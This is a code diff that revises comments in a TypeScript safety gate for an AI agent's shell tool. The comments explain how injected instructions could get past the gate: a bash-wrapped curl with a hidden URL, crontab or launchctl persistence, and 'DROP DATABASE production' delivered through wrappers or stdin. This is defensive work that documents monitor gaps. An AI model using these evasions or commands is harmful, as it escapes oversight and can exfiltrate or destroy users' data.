-   * closed: `bash -lc 'curl https://x'` names an address, so it tainted. Take the address out of
-   * the command - which every real script does the moment the URL sits in a variable, and which an
-   * injected instruction has every reason to do - and the interpreter was an unknown executable
-   * running an unknown command. `bash -lc 'curl -s "$U" -o page.html'` read an attacker-chosen page
-   * into the turn, `shellDestinations` found no address to charge to the novelty budget, and the
-   * floor went on reporting the turn clean: no egress card on what left afterwards, and a write to
-   * the brief with no card either. The address scan stays, because it catches the shapes this
-   * cannot resolve; it is no longer the only thing looking past the wrapper.
+   * Judged at its outer executable, with a scan for a literal http(s) address as the only thing
+   * that reaches inside a script, the invocation would look closed and not be:
+   * `bash -lc 'curl https://x'` names an address, so it taints. Take the address out of the
+   * command, which every real script does the moment the URL sits in a variable, and which an
+   * injected instruction has every reason to do, and the interpreter is an unknown executable
+   * running an unknown command. `bash -lc 'curl -s "$U" -o page.html'` would read an
+   * attacker-chosen page into the turn, `shellDestinations` would find no address to charge to the
+   * novelty budget, and the floor would go on reporting the turn clean: no egress card on what left
+   * afterwards, and a write to the brief with no card either. So each resolved command is judged.
+   * The address scan stays, because it catches the shapes this cannot resolve; it is not the only
+   * thing looking past the wrapper.
    */
   /*
    * The literal scan and not `callDestinations`, and the difference is the question rather than an
@@ -4320,8 +4304,8 @@ export const untrustedShellOrigin = (args: Record<string, unknown>): string | nu
      * interpreter this file does not parse, and it stays for that. What it must not do is mark a
      * turn for MENTIONING an address: `echo http://192.168.1.50/notes`, `grep -r
      * "http://wiki.internal" src/`, `git commit -m "point config at http://wiki.internal/…"` and
-     * `export http_proxy=http://10.0.0.5:3128` each open nothing and each was 'network command
-     * output', after which a write to the brief on the same turn was carded as a tainted write.
+     * `export http_proxy=http://10.0.0.5:3128` each open nothing, and reading them as 'network
+     * command output' would card a later write to the brief on the same turn as a tainted write.
      * So the scan is asked only when some command in the call is one whose socket this file
      * cannot rule out - an interpreter, a program it has never heard of - and not when every
      * command is a builtin, a coreutil that reads files, a file writer, or git off the network.
@@ -4504,7 +4488,8 @@ export const publishingOperation = (
     }
     /*
      * An interpreter placed after the image - `docker run img sh -c "npm publish"` - is a name
-     * this file places, so the walk used to stop at it and the script in its `-c` was never read.
+     * this file places, so without this the walk would stop at it and never read the script in
+     * its `-c`.
      * A top-level interpreter is read by `scriptCommands` before this walk ever sees it; one
      * reached mid-walk is read here the same way, and judged by what its script runs.
      */
@@ -4919,12 +4904,12 @@ const STORE_DRY_RUN_OPTIONS = new Map<string, RegExp>([
 /**
  * Work that outlives the turn, and the reads of the same tools that must not card.
  *
- * The contract's autonomous sentence used to name only files - "a startup file, hook or tool
- * configuration it would run on its own afterwards" - and `deferredExecutionPaths` keeps that half.
- * What no path rule can see is the half that never names a file: `crontab -`, `at now + 1 minute`, `systemctl --user enable` and
- * `launchctl load` all install something that runs after this task and every card in it is over,
- * and all four were free in balanced and autonomous. None of them is inside `CHECKPOINT_CONTENT`
- * either, so a rewind of the turn leaves the schedule running.
+ * `deferredExecutionPaths` keeps the half of the contract's autonomous sentence that names files -
+ * "a startup file, hook or tool configuration it would run on its own afterwards". What no path
+ * rule can see is the half that never names a file: `crontab -`, `at now + 1 minute`,
+ * `systemctl --user enable` and `launchctl load` all install something that runs after this task
+ * and every card in it is over. None of them is inside `CHECKPOINT_CONTENT` either, so a rewind of
+ * the turn leaves the schedule running.
  *
  * `systemctl start`, `stop`, `restart` and `daemon-reload` are absent: they change what is running
  * now and nothing about what runs after a reboot, and the owner's own deploy scenario restarts a
@@ -5175,17 +5160,18 @@ export const destructionOperation = (tokens: readonly string[]): DestructionOper
 /**
  * A statement the wrapper's quoting took apart, read back off the whole script.
  *
- * `scriptCommands` splits a script on whitespace, so `bash -lc 'psql -c "DROP DATABASE production"'`
- * arrives at the walk as the four tokens `psql`, `-c`, `"DROP` and `DATABASE`, and the statement
- * that decides the card is no longer a statement. Measured: the bare form carded in all three modes
- * and the wrapped form was free in balanced and autonomous - and `shell`'s own description tells the
- * model to reach for `bash -lc` the moment it needs a pipe or a redirect, so the wrapped spelling is
- * the one real work arrives in. Every other gate in this file solved this by reading the script;
- * this one has to read it UNSPLIT, because the evidence spans the split.
+ * `scriptCommands` splits a script on whitespace, so
+ * `bash -lc 'psql -c "DROP DATABASE production"'` arrives at the walk as the four tokens `psql`,
+ * `-c`, `"DROP` and `DATABASE`, and the statement that decides the card is no longer a statement.
+ * Without reading it back, the bare form would card in all three modes and the wrapped form would
+ * be free in balanced and autonomous - and `shell`'s own description tells the model to reach for
+ * `bash -lc` the moment it needs a pipe or a redirect, so the wrapped spelling is the one real work
+ * arrives in. Every other gate in this file solves this by reading the script; this one has to read
+ * it UNSPLIT, because the evidence spans the split.
  *
  * The pair is required, not either half, and the client half is asked of the HEAD of a command
  * rather than of any word in the script - which is the walk's own stopping condition, kept here
- * because a raw scan of the body does not have it. Measured: a body scan carded
+ * because a raw scan of the body does not have it. A body scan would card
  * `echo "psql -c DROP DATABASE x"`, which is the counterweight row `git commit -m "npm publish"`
  * already holds one table along. `grep -n "DROP TABLE" schema.sql` runs `grep` and raises nothing;
  * `psql -f migrations/001_init.sql` names no statement and raises nothing, which is the shape the
@@ -5196,19 +5182,17 @@ export const destructionOperation = (tokens: readonly string[]): DestructionOper
  * each other. That costs a card on a script that would not have run the pair, and the alternative
  * is missing every script that does.
  *
- * `consumer` IS THE PROGRAM THE TEXT IS BEING FED TO, and without it this read the body for a
- * client and then refused to look at the one place a client is always named. `shell` takes a
+ * `consumer` IS THE PROGRAM THE TEXT IS BEING FED TO, and without it this would read the body for a
+ * client and then refuse to look at the one place a client is always named. `shell` takes a
  * `stdin` string - it is in the shipped schema, and `execution.ts` ends the child's stdin with it -
  * so `shell(executable: 'psql', args: ['-d', 'postgres'], stdin: 'DROP DATABASE production;')` is a
- * spelling the model can write today. Measured before this parameter existed: free in balanced AND
- * autonomous on psql, mysql, sqlite3, mongosh and redis-cli, while
- * `shell(executable: 'bash', stdin: 'dropdb production')` carded - the gate read stdin when the
- * executable was an interpreter and ignored it when the executable was the program that would
- * consume it. Both halves of the evidence were already being computed: `commandScript` returned the
- * statement and `destructiveSqlOperation` named it, and nothing put them together, because
- * `scriptCommands` finds the head of `DROP DATABASE production;` to be `drop`. The `DESTROYS` row
- * that looked like it covered this passed for the wrong reason - its body spelled `psql` a second
- * time inside the heredoc, so a head existed to find.
+ * spelling the model can write. Without `consumer` it would be free in balanced and autonomous on
+ * psql, mysql, sqlite3, mongosh and redis-cli, while
+ * `shell(executable: 'bash', stdin: 'dropdb production')` cards - stdin read when the executable is
+ * an interpreter and ignored when the executable is the program that would consume it.
+ * `commandScript` returns the statement and `destructiveSqlOperation` names it, but
+ * `scriptCommands` finds the head of `DROP DATABASE production;` to be `drop`, so only the consumer
+ * puts the two together.
  *
  * The key-value clients are read here and not in the arm above for one reason that only holds on
  * stdin: a redis command stream carries no connection options, so the command really is the first
